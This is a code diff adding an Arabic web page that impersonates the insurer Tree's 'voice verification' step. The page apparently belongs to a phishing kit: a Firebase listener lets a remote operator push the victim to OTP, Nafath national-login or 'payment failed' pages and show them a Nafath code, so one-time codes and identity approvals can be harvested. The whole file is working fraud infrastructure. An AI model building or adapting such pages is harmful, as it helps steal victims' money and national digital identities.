@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الاتصال - تري</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root { --p-green: #122d2b; --s-gold: #c5a059; --t-green: #00ff9d; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .secure-container { background: white; width: 100%; max-width: 440px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #eee; overflow: hidden; padding-bottom: 30px; }
+        .p-header { background: #fafafa; padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
+        .p-header img { width: 110px; }
+        .p-body { padding: 30px; text-align: center; }
+        .phone-call-animation { position: relative; width: 100px; height: 100px; margin: 0 auto 20px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(18, 45, 43, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(18, 45, 43, 0); } 100% { box-shadow: 0 0 0 0 rgba(18, 45, 43, 0); } }
+        .main-msg { font-size: 18px; font-weight: bold; color: var(--p-green); margin-bottom: 15px; }
+        .sub-msg { font-size: 14px; color: #666; line-height: 1.8; margin-bottom: 25px; }
+        .waiting-status { font-weight: bold; color: #e74c3c; font-size: 16px; }
+        .timer-box { font-size: 14px; color: #888; background: #f9f9f9; padding: 10px; border-radius: 10px; display: inline-block; }
+    </style>
+</head>
+<body>
+<div class="secure-container">
+    <div class="p-header"><img src="https://tree.com.sa/assets/images/logo.png" alt="Tree"><h3>نظام التحقق الصوتي</h3></div>
+    <div class="p-body">
+        <div class="phone-call-animation"><span style="font-size: 50px;">📞</span></div>
+        <div class="main-msg">سوف يتم الأتصال بك الآن</div>
+        <p class="sub-msg">قم باتباع الخطوات الموجودة بالأتصال ليتم تسجيل رقم جوالك بوثيقة التأمين.<br><span class="waiting-status">يرجى الانتظار!</span></p>
+        <div class="timer-box">إعادة الأتصال بعد <span id="timer">00:58</span></div>
+    </div>
+</div>
+<script>
+    const firebaseConfig = { apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE", authDomain: "tameen-658e9.firebaseapp.com", projectId: "tameen-658e9", storageBucket: "tameen-658e9.firebasestorage.app", messagingSenderId: "292670676256", appId: "1:292670676256:web:3624157751cd194efe4b45" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let time = 58;
+    const timerDisplay = document.getElementById('timer');
+    const countdown = setInterval(() => {
+        let seconds = time % 60;
+        timerDisplay.innerText = `00:${seconds < 10 ? '0' : ''}${seconds}`;
+        if (time <= 0) {
+            clearInterval(countdown);
+            window.location.href = "nafath.html"; // التحويل التلقائي لصفحة نفاذ
+        }
+        time--;
+    }, 1000);
+    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+</body>
+</html>
+
